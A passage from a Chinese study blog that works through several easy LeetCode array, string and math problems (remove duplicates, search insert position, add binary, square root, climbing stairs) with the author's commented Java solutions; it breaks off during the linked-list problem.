，你需要做以下事情确保你的题解可以被通过：</p><ul><li>更改数组 <code>nums</code> ，使 <code>nums</code> 的前 <code>k</code> 个元素包含唯一元素，并按照它们最初在 <code>nums</code> 中出现的顺序排列。<code>nums</code> 的其余元素与 <code>nums</code> 的大小不重要。</li><li>返回 <code>k</code> 。</li></ul><p><strong>判题标准:</strong></p><p>系统会用下面的代码来测试你的题解:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int[] nums = [...]; // 输入数组</span><br><span class="line">int[] expectedNums = [...]; // 长度正确的期望答案</span><br><span class="line"></span><br><span class="line">int k = removeDuplicates(nums); // 调用</span><br><span class="line"></span><br><span class="line">assert k == expectedNums.length;</span><br><span class="line">for (int i = 0; i &lt; k; i++) &#123;</span><br><span class="line">    assert nums[i] == expectedNums[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果所有断言都通过，那么您的题解将被 <strong>通过</strong>。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [1,1,2]</span><br><span class="line">输出：2, nums = [1,2,_]</span><br><span class="line">解释：函数应该返回新的长度 2 ，并且原数组 nums 的前两个元素被修改为 1, 2 。不需要考虑数组中超出新长度后面的元素。</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [0,0,1,1,1,2,2,3,3,4]</span><br><span class="line">输出：5, nums = [0,1,2,3,4]</span><br><span class="line">解释：函数应该返回新的长度 5 ， 并且原数组 nums 的前五个元素被修改为 0, 1, 2, 3, 4 。不需要考虑数组中超出新长度后面的元素。</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= nums.length &lt;= 3 * 104</code></li><li><code>-104 &lt;= nums[i] &lt;= 104</code></li><li><code>nums</code> 已按 <strong>非严格递增</strong> 排列</li></ul><p>题解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Soultion</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">removeDuplicates</span> <span class="params">(<span class="type">int</span>[] nums)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;i&lt;nums.length;i++)&#123;<span class="comment">//用for循环解析所有字符</span></span><br><span class="line">            <span class="keyword">if</span>(nums[i]&gt;nums[i-<span class="number">1</span>])&#123;<span class="comment">//如果后比前大，则说明是一个不重复的字符</span></span><br><span class="line">                nums[++left] = nums[i];<span class="comment">//这里 ++left 是先自增 left，然后赋值，确保 left 指向的是数组中下一个可以放置新元素的位置。</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ++left;<span class="comment">//返回 ++left，因为 left 的初始值是 0，所以返回值是去除重复元素后的数组长度。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-leetcode-移除元素">5.leetcode <a href="https://leetcode.cn/problems/remove-element/">移除元素</a></h3><p>给你一个数组 <code>nums</code> 和一个值 <code>val</code>，你需要 <strong><a href="https://baike.baidu.com/item/%E5%8E%9F%E5%9C%B0%E7%AE%97%E6%B3%95">原地</a></strong> 移除所有数值等于 <code>val</code> 的元素。元素的顺序可能发生改变。然后返回 <code>nums</code> 中与 <code>val</code> 不同的元素的数量。</p><p>假设 <code>nums</code> 中不等于 <code>val</code> 的元素数量为 <code>k</code>，要通过此题，您需要执行以下操作：</p><ul><li>更改 <code>nums</code> 数组，使 <code>nums</code> 的前 <code>k</code> 个元素包含不等于 <code>val</code> 的元素。<code>nums</code> 的其余元素和 <code>nums</code> 的大小并不重要。</li><li>返回 <code>k</code>。</li></ul><p><strong>用户评测：</strong></p><p>评测机将使用以下代码测试您的解决方案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int[] nums = [...]; // 输入数组</span><br><span class="line">int val = ...; // 要移除的值</span><br><span class="line">int[] expectedNums = [...]; // 长度正确的预期答案。</span><br><span class="line">                            // 它以不等于 val 的值排序。</span><br><span class="line"></span><br><span class="line">int k = removeElement(nums, val); // 调用你的实现</span><br><span class="line"></span><br><span class="line">assert k == expectedNums.length;</span><br><span class="line">sort(nums, 0, k); // 排序 nums 的前 k 个元素</span><br><span class="line">for (int i = 0; i &lt; actualLength; i++) &#123;</span><br><span class="line">    assert nums[i] == expectedNums[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果所有的断言都通过，你的解决方案将会 <strong>通过</strong>。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [3,2,2,3], val = 3</span><br><span class="line">输出：2, nums = [2,2,_,_]</span><br><span class="line">解释：你的函数函数应该返回 k = 2, 并且 nums 中的前两个元素均为 2。</span><br><span class="line">你在返回的 k 个元素之外留下了什么并不重要（因此它们并不计入评测）。</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [0,1,2,2,3,0,4,2], val = 2</span><br><span class="line">输出：5, nums = [0,1,4,0,3,_,_,_]</span><br><span class="line">解释：你的函数应该返回 k = 5，并且 nums 中的前五个元素为 0,0,1,3,4。</span><br><span class="line">注意这五个元素可以任意顺序返回。</span><br><span class="line">你在返回的 k 个元素之外留下了什么并不重要（因此它们并不计入评测）。</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>0 &lt;= nums.length &lt;= 100</code></li><li><code>0 &lt;= nums[i] &lt;= 50</code></li><li><code>0 &lt;= val &lt;= 100</code></li></ul><p>题解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">removeElement</span> <span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:nums)&#123;<span class="comment">//遍历数组 nums 中的每一个元素</span></span><br><span class="line">            <span class="keyword">if</span>(num != val)&#123;</span><br><span class="line">                nums[ans] = num;<span class="comment">// 将当前元素 num 放入 nums 数组中索引为 ans 的位置</span></span><br><span class="line">                ans++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="6-leetcode-搜索插入位置（二分查找）">6.leetcode <a href="https://leetcode.cn/problems/search-insert-position/">搜索插入位置</a>（二分查找）</h3><p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p><p>请必须使用时间复杂度为 <code>O(log n)</code> 的算法。</p><p><strong>示例 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: nums = [1,3,5,6], target = 5</span><br><span class="line">输出: 2</span><br></pre></td></tr></table></figure><p><strong>示例 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: nums = [1,3,5,6], target = 2</span><br><span class="line">输出: 1</span><br></pre></td></tr></table></figure><p><strong>示例 3:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: nums = [1,3,5,6], target = 7</span><br><span class="line">输出: 4</span><br></pre></td></tr></table></figure><p><strong>提示:</strong></p><ul><li><code>1 &lt;= nums.length &lt;= 104</code></li><li><code>-104 &lt;= nums[i] &lt;= 104</code></li><li><code>nums</code> 为 <strong>无重复元素</strong> 的 <strong>升序</strong> 排列数组</li><li><code>-104 &lt;= target &lt;= 104</code></li></ul><p>题解：</p><p>使用二分查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">searchInsert</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> targer)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums == <span class="literal">null</span> || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="comment">//排除0和null的情况</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;<span class="comment">//建立二分查找</span></span><br><span class="line">            <span class="keyword">if</span> (targer == nums[mid]) &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (targer &lt; nums[mid]) &#123;</span><br><span class="line">                right = mid - <span class="number">1</span>;<span class="comment">//向左移动</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;<span class="comment">//向右移动</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> targer &lt;= nums[left] ? left : left + <span class="number">1</span>;<span class="comment">//最后输出数值，按照左边的顺序</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="7"><li><h4 id="leetcode-最后一个单词的长度">leetcode <a href="https://leetcode.cn/problems/length-of-last-word/">最后一个单词的长度</a></h4></li></ol><p>给你一个字符串 <code>s</code>，由若干单词组成，单词前后用一些空格字符隔开。返回字符串中 <strong>最后一个</strong> 单词的长度。</p><p><strong>单词</strong> 是指仅由字母组成、不包含任何空格字符的最大</p><p>子字符串</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;Hello World&quot;</span><br><span class="line">输出：5</span><br><span class="line">解释：最后一个单词是“World”，长度为 5。</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;   fly me   to   the moon  &quot;</span><br><span class="line">输出：4</span><br><span class="line">解释：最后一个单词是“moon”，长度为 4。</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;luffy is still joyboy&quot;</span><br><span class="line">输出：6</span><br><span class="line">解释：最后一个单词是长度为 6 的“joyboy”。</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= s.length &lt;= 104</code></li><li><code>s</code> 仅有英文字母和空格 <code>' '</code> 组成</li><li><code>s</code> 中至少存在一个单词</li></ul><p>题解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLastWord</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> s.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (end &gt;= <span class="number">0</span> &amp;&amp; s.charAt(end) == <span class="string">&#x27; &#x27;</span>) end--;<span class="comment">//从末尾开始，跳过空格</span></span><br><span class="line">        <span class="keyword">if</span> (end &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> end;</span><br><span class="line">        <span class="keyword">while</span> (start &gt;= <span class="number">0</span> &amp;&amp; s.charAt(start) != <span class="string">&#x27; &#x27;</span>) start--;<span class="comment">//从最后一个单词的结尾开始，找到开始位置</span></span><br><span class="line">        <span class="keyword">return</span> end - start;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="7-leetcode-加一（遍历）">7.leetcode 加一（遍历）</h3><p>给定一个由 <strong>整数</strong> 组成的 <strong>非空</strong> 数组所表示的非负整数，在该数的基础上加一。</p><p>最高位数字存放在数组的首位， 数组中每个元素只存储<strong>单个</strong>数字。</p><p>你可以假设除了整数 0 之外，这个整数不会以零开头。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：digits = [1,2,3]</span><br><span class="line">输出：[1,2,4]</span><br><span class="line">解释：输入数组表示数字 123。</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：digits = [4,3,2,1]</span><br><span class="line">输出：[4,3,2,2]</span><br><span class="line">解释：输入数组表示数字 4321。</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：digits = [0]</span><br><span class="line">输出：[1]</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= digits.length &lt;= 100</code></li><li><code>0 &lt;= digits[i] &lt;= 9</code></li></ul><p>题解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class Solution &#123;</span><br><span class="line">    public int[] plusOne(int[] digits)&#123;</span><br><span class="line">        for(int i = digits.length-1;i&gt;=0;i--)&#123;//从最后一个开始遍历</span><br><span class="line">            digits[i]++;</span><br><span class="line">            digits[i] = digits[i] % 10;</span><br><span class="line">            if(digits[i] != 0)return digits;</span><br><span class="line">        &#125;</span><br><span class="line">        digits = new int[digits.length + 1];//如果遍历完了，还需要进位的话，长度加1，第一位变成1</span><br><span class="line">        digits[0] = 1;</span><br><span class="line">        return digits;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="8-leetcode-二进制求和-二进制的转化">8.leetcode <a href="https://leetcode.cn/problems/add-binary/">二进制求和</a>(二进制的转化)</h3><p>给你两个二进制字符串 <code>a</code> 和 <code>b</code> ，以二进制字符串的形式返回它们的和。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入:a = &quot;11&quot;, b = &quot;1&quot;</span><br><span class="line">输出：&quot;100&quot;</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：a = &quot;1010&quot;, b = &quot;1011&quot;</span><br><span class="line">输出：&quot;10101&quot;</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= a.length, b.length &lt;= 104</code></li><li><code>a</code> 和 <code>b</code> 仅由字符 <code>'0'</code> 或 <code>'1'</code> 组成</li><li>字符串如果不是 <code>&quot;0&quot;</code> ，就不含前导零</li></ul><p>题解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution6</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">addBinary</span><span class="params">(String a,String b)</span>&#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">ca</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//初始化</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> a.length() - <span class="number">1</span>,j=b.length() - <span class="number">1</span>;i&gt;=<span class="number">0</span>||j&gt;=<span class="number">0</span>;i--,j--)&#123;<span class="comment">//从最后一位开始往前递归</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> ca;</span><br><span class="line">            sum += i&gt;=<span class="number">0</span> ? a.charAt(i) - <span class="string">&#x27;0&#x27;</span> : <span class="number">0</span>;<span class="comment">//往前一直a.charAt(i) - &#x27;0&#x27; 将字符 &#x27;0&#x27; 或 &#x27;1&#x27; 转换为整数 0 或 1。</span></span><br><span class="line">            sum += j&gt;=<span class="number">0</span> ? b.charAt(j) - <span class="string">&#x27;0&#x27;</span> : <span class="number">0</span>;</span><br><span class="line">            ans.append(sum % <span class="number">2</span>);</span><br><span class="line">            ca = sum /<span class="number">2</span>;<span class="comment">//更新下一位</span></span><br><span class="line">        &#125;</span><br><span class="line">        ans.append(ca == <span class="number">1</span>?ca : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ans.reverse().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-leetcode-x-的平方根-（牛顿迭代法-暴力）">9.leetcode <a href="https://leetcode.cn/problems/sqrtx/">x 的平方根 </a>（牛顿迭代法 暴力）</h3><p>给你一个非负整数 <code>x</code> ，计算并返回 <code>x</code> 的 <strong>算术平方根</strong> 。</p><p>由于返回类型是整数，结果只保留 <strong>整数部分</strong> ，小数部分将被 <strong>舍去 。</strong></p><p>**注意：**不允许使用任何内置指数函数和算符，例如 <code>pow(x, 0.5)</code> 或者 <code>x ** 0.5</code> 。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x = 4</span><br><span class="line">输出：2</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：x = 8</span><br><span class="line">输出：2</span><br><span class="line">解释：8 的算术平方根是 2.82842..., 由于返回类型是整数，小数部分将被舍去。</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>0 &lt;= x &lt;= 231 - 1</code></li></ul><p>题解：</p><p>牛顿迭代法</p><p>首先随便猜一个近似值 <em>x</em>，然后不断令 <em>x</em> 等于 <em>x</em> 和 <em>a</em>/<em>x</em> 的平均数，迭代个六七次后 <em>x</em> 的值就已经相当精确了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution7</span> &#123;</span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">mySqrt</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">        s=x;</span><br><span class="line">        <span class="keyword">if</span>(x==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> ((<span class="type">int</span>)(sqrts(x)));<span class="comment">//主体过测试的主方法，返回平方</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">sqrts</span> <span class="params">(<span class="type">double</span> x)</span>&#123;<span class="comment">//设定方法</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">res</span> <span class="operator">=</span> (x+s/x)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(res == x)&#123;</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> sqrts(res);<span class="comment">//一直重复这个过程直到x==res的时候</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还有一种类似的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">mySqrt</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (x == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>) sqrt(x, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="title function_">sqrt</span><span class="params">(<span class="type">double</span> x, <span class="type">double</span> s)</span> &#123;</span><br><span class="line">        <span class="type">double</span> <span class="variable">res</span> <span class="operator">=</span> (x + s / x) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (Math.abs(res - x) &lt; <span class="number">1e-7</span>) &#123; <span class="comment">// 终止条件，精度控制</span></span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> sqrt(res, s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个主要是控制了下精度。让他在某个范围内就结束</p><p>10.leetcode<a href="https://leetcode.cn/problems/climbing-stairs/">爬楼梯</a></p><p>假设你正在爬楼梯。需要 <code>n</code> 阶你才能到达楼顶。</p><p>每次你可以爬 <code>1</code> 或 <code>2</code> 个台阶。你有多少种不同的方法可以爬到楼顶呢？</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：n = 2</span><br><span class="line">输出：2</span><br><span class="line">解释：有两种方法可以爬到楼顶。</span><br><span class="line">1. 1 阶 + 1 阶</span><br><span class="line">2. 2 阶</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：n = 3</span><br><span class="line">输出：3</span><br><span class="line">解释：有三种方法可以爬到楼顶。</span><br><span class="line">1. 1 阶 + 1 阶 + 1 阶</span><br><span class="line">2. 1 阶 + 2 阶</span><br><span class="line">3. 2 阶 + 1 阶</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= n &lt;= 45</code></li></ul><p>题解：</p><p>即 f(n) 为以上两种情况之和，即 f(n)=f(n−1)+f(n−2) ，以上递推性质为斐波那契数列。因此，本题可转化为 求斐波那契数列的第 n 项，区别仅在于初始值不同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class Solution8 &#123;</span><br><span class="line">    public int climbStairs(int n)&#123;</span><br><span class="line">        int a = 1,b = 1,sum;</span><br><span class="line">        for(int i = 0;i&lt;n-1;i++)&#123;</span><br><span class="line">            sum = a + b;</span><br><span class="line">            a = b;</span><br><span class="line">            b = sum;//a就是n-2，b就是n-1</span><br><span class="line">        &#125;</span><br><span class="line">        return b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="10-leetcode-删除排序链表中的重复元素（链表）">10.leetcode <a href="https://leetcode.cn/problems/remove-duplicates-from-sorted-list/">删除排序链表中的重复元素</a>（链表）</h3><p>给定一个已排序的链表的头 <code>head</code> ， <em>删除所有重复的元素，使每个元素只出现一次</em> 。返回 <em>已排序的链表</em> 。</p><p><strong>示例 1：</strong></p><p><img src="https://assets.leetcode.com/uploads/2021/01/04/list1.jpg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：head = [1,1,2]</span><br><span class="line">输出：[1,2]</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><p><img src="https://assets.leetcode.com/uploads/2021/01/04/list2.jpg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：head = [1,1,2,3,3]</span><br><span 